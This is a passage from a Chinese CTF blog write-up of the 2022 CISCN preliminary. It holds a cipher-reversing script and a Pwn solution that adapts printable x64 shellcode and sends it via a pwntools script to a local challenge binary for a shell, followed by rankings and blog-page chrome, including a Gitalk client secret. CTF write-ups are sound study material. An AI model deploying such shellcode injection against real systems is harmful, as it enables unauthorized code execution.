+            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>Crypt<span class="token punctuation">.</span>CIPHER<span class="token punctuation">.</span>YY<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                y <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>z <span class="token operator">&gt;&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> z<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>s <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s <span class="token operator">&gt;&gt;</span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+                y <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token number">4294967295</span>
+                s <span class="token operator">+=</span> Crypt<span class="token punctuation">.</span>CIPHER<span class="token punctuation">.</span>XX
+                z <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>y <span class="token operator">&gt;&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> y<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>s <span class="token operator">+</span> key<span class="token punctuation">[</span>s <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+                z <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token number">4294967295</span>
+            <span class="token keyword">return</span> <span class="token punctuation">(</span>y<span class="token punctuation">,</span> z<span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        i <span class="token operator">=</span> <span class="token number">0</span>
+        lst_ch <span class="token operator">=</span> <span class="token number">0</span>
+        p <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+        <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            c <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
+            p<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c <span class="token operator">^</span> lst_ch <span class="token operator">^</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            lst_ch <span class="token operator">=</span> c
+            i <span class="token operator">+=</span> <span class="token number">1</span>
+        p <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+        k <span class="token operator">=</span> <span class="token string">'aaaassssddddffff'</span>
+        cipher_text <span class="token operator">=</span> Crypt<span class="token punctuation">.</span>CIPHER<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>p<span class="token punctuation">,</span> k<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> cipher_text <span class="token operator">==</span> <span class="token string">'f469358b7f165145116e127ad6105917bce5225d6d62a714c390c5ed93b22d8b6b102a8813488fdb'</span>
+
+dec <span class="token operator">=</span> Crypt<span class="token punctuation">.</span>CIPHER<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span><span class="token string">'f469358b7f165145116e127ad6105917bce5225d6d62a714c390c5ed93b22d8b6b102a8813488fdb'</span><span class="token punctuation">,</span> <span class="token string">'aaaassssddddffff'</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>dec<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    lst_ch <span class="token operator">=</span> <span class="token number">0</span> <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> dec<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>
+    dec<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> dec<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> lst_ch <span class="token operator">^</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">,</span> dec<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+p <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">if</span> Crypt<span class="token punctuation">.</span>check<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'yes'</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="login-nomal"><a href="#login-nomal" class="headerlink" title="login-nomal"></a>login-nomal</h3><p>通过搜索可以找到x64可打印shellcode </p>
+<p><a target="_blank" rel="noopener" href="https://nuoye-blog.github.io/2020/05/09/8002891b/">https://nuoye-blog.github.io/2020/05/09/8002891b/</a></p>
+<p><code>PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA</code></p>
+<p>直接放入发现执行报错，使用反汇编得到汇编代码</p>
+<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">push rax
+push rax
+pop rcx
+push 0x41413030
+pop rax
+xor dword ptr [rcx + 0x30], eax
+push 0x34303041
+pop rax
+xor dword ptr [rcx + 0x34], eax
+push 0x41303041
+pop rax
+xor dword ptr [rcx + 0x38], eax
+push rcx
+pop rax
+xor al, 0x34
+push rax
+push 0x30
+pop rax
+xor al, 0x30
+push rax
+pop rdx
+push rax
+push 0x41
+pop rax
+xor al, 0x7a
+outsb dx, byte ptr [rsi]
+outsd dx, dword ptr [rsi]
+outsb dx, byte ptr [rsi]
+push rdx
+pop rcx
+pop rdx
+outsb dx, byte ptr [rsi]
+pop r8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>而题目中使用rdx作为跳转寄存器</p>
+<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">.text:0000000000000E8B                 call    _mmap
+.text:0000000000000E90                 cdqe
+.text:0000000000000E92                 mov     [rbp+dest], rax
+.text:0000000000000E96                 mov     rax, [rbp+s]
+.text:0000000000000E9A                 mov     rdi, rax        ; s
+.text:0000000000000E9D                 call    _strlen
+.text:0000000000000EA2                 mov     rdx, rax        ; n
+.text:0000000000000EA5                 mov     rcx, [rbp+s]
+.text:0000000000000EA9                 mov     rax, [rbp+dest]
+.text:0000000000000EAD                 mov     rsi, rcx        ; src
+.text:0000000000000EB0                 mov     rdi, rax        ; dest
+.text:0000000000000EB3                 call    _memcpy
+.text:0000000000000EB8                 mov     rax, [rbp+dest]
+.text:0000000000000EBC                 mov     [rbp+var_20], rax
+.text:0000000000000EC0                 mov     rdx, [rbp+var_20]
+.text:0000000000000EC4                 mov     eax, 0
+.text:0000000000000EC9                 call    rdx
+.text:0000000000000ECB                 jmp     short loc_EE3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>对shellcode进行修改可得：</p>
+<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">push rdx
+push rdx
+pop rcx
+push 0x41413030
+pop rax
+xor dword ptr [rcx + 0x30], eax
+push 0x34303041
+pop rax
+xor dword ptr [rcx + 0x34], eax
+push 0x41303041
+pop rax
+xor dword ptr [rcx + 0x38], eax
+push rcx
+pop rax
+xor al, 0x34
+push rax
+push 0x30
+pop rax
+xor al, 0x30
+push rax
+pop rdx
+push rax
+push 0x41
+pop rax
+xor al, 0x7a
+.byte 0x6e
+.byte 0x6f
+.byte 0x4e
+.byte 0x44
+.byte 0x6e
+.byte 0x52
+.byte 0x59
+.byte 0x5a
+.byte 0x6e
+.byte 0x43
+.byte 0x58
+.byte 0x41<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>编译一下发现其实就是前两个字符不同</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">:</span> asm<span class="token punctuation">(</span><span class="token string">'push rdx'</span><span class="token punctuation">)</span>
+Out<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">b'R'</span>
+
+In <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">:</span> asm<span class="token punctuation">(</span><span class="token string">'push rax'</span><span class="token punctuation">)</span>
+Out<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">b'P'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>直接改前两个字符</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./login'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'&gt;&gt;&gt;'</span><span class="token punctuation">,</span><span class="token string">b'opt:1\nmsg:ro0tt\n'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'&gt;&gt;&gt;'</span><span class="token punctuation">,</span><span class="token string">b'opt:2\nmsg:RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA1\n'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><img src="/2022/05/31/CTF_2022CISCN_preliminary/image-20220602223244430.png"></p>
+<p><img src="/2022/05/31/CTF_2022CISCN_preliminary/image-20220602223233744.png" alt="场景实操排名"></p>
+<p><img src="/2022/05/31/CTF_2022CISCN_preliminary/image-20220602213646072.png" alt="总排名"></p>
+<p>华东南太卷啦！</p>
+<p><strong>场景实操 / CTF 打了全国第33名，华东南赛区第9；总排名全国第34，华东南第10。</strong></p>
+<p><strong>xdlddw！</strong></p>
+<p>另外，感觉 i春秋 这次分数设置得有点不合理，最低分设成了8pts，500-&gt;8 曲线太陡峭了，于是最后分差都很小，挺离谱的。</p>
+<p>就这样吧，摸了。队友们强强！</p>
+<p>经过两个多月的努力，上海终于进入全面恢复正常生产生活阶段了（终于解封了啊…… 太难了</p>
+<p><em>溜了溜了喵（</em></p>
+<!----
+
+---
+
+
+
+### Ezpentest
+
+> 简单的渗透，来试试吗？
+>
+> 提示1：mysql8的utf8mb4_bin应用
+>
+> 提示2：给出waf过滤拦截的关键代码。
+>
+> [附件下载](https://pan.baidu.com/s/1QQU-4lrpYBdTtWIXF-ubeQ) 提取码（GAME）[备用下载](https://share.weiyun.com/o8MF5UBo)
+
+
+
+### cmdbrowser
+
+> 来测试一下我写的curl接口安全吗？
+>
+> [附件下载](https://pan.baidu.com/s/1_UJjzRUWizBbbDjy-yKpQg) 提取码（GAME）[备用下载](https://share.weiyun.com/m7pAQByX)
+
+
+
+## Misc
+
+### babydisk
+
+> 小明在路边捡到了一块硬盘，你可以帮助小明分析里面有什么好东西吗？
+>
+> [附件下载](https://pan.baidu.com/s/1gY7M38cJusrcTgiDgkHMPA) 提取码（GAME）[备用下载](https://share.weiyun.com/oswWUQjv)
+
+
+
+----->
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://miaotony.xyz" rel="external nofollow noreferrer">MiaoTony</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://miaotony.xyz/2022/05/31/CTF_2022CISCN_preliminary/">https://miaotony.xyz/2022/05/31/CTF_2022CISCN_preliminary/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特别声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://miaotony.xyz" target="_blank">MiaoTony</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                                <a href="/tags/WriteUp/">
+                                    <span class="chip bg-color">WriteUp</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="qq,qzone,wechat,weibo,twitter,facebook,google,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">打赏一下让我来点好吃好玩的呗~</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <!-- 
+                            <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li> 
+                        -->
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <!-- 
+                        <div id="alipay">
+                        <img src="/" class="reward-img" alt="支付宝打赏二维码">
+                        </div> 
+                -->
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.min.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: '116343b4650fce4789b6',
+        clientSecret: '3e9be2ad6c9b693af1753290c7c059b1e4f34d5d',
+        repo: 'miaotony.github.io',
+        owner: 'miaotony',
+        admin: "miaotony",
+        id: '2022-05-31T20-26-00',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2022/05/31/CTF_2022CISCN_preliminary/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="CTF | 2022 CISCN 初赛 WriteUp">
+                        
+                        <span class="card-title">CTF | 2022 CISCN 初赛 WriteUp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            又是一年一度的国赛，今年知识问答和场景实操加起来持续10h，比去年轻松了不少，这篇来记录一下初赛的writeup。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-31
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/WriteUp/">
+                        <span class="chip bg-color">WriteUp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/04/26/CTF_2022T-Star/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="CTF | 2022 未知之境 腾讯网络安全T-Star高校挑战赛 WriteUp">
+                        
+                        <span class="card-title">CTF | 2022 未知之境 腾讯网络安全T-Star高校挑战赛 WriteUp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            前几天AK了个腾讯的T-Star高校挑战赛，题目比较偏向Misc和Web，这里记录一下解题过程。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/WriteUp/">
+                        <span class="chip bg-color">WriteUp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('200')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: MiaoTony&#39;s小窝<br />'
+            + '文章作者: MiaoTony<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者MiaoTony所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('1'),
+            headingSelector: 'h2, h3, h4, h5'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4, h5').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+        <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2022</span>
+            
+            <a href="/about" target="_blank">MiaoTony</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+                        &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">351.9k</span>&nbsp;字
+                                                                                    <span id="busuanzi_container_site_pv">
+			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+                                    <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+                        <br>
+                        <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2019";
+                    var startMonth = "11";
+                    var startDate = "28";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
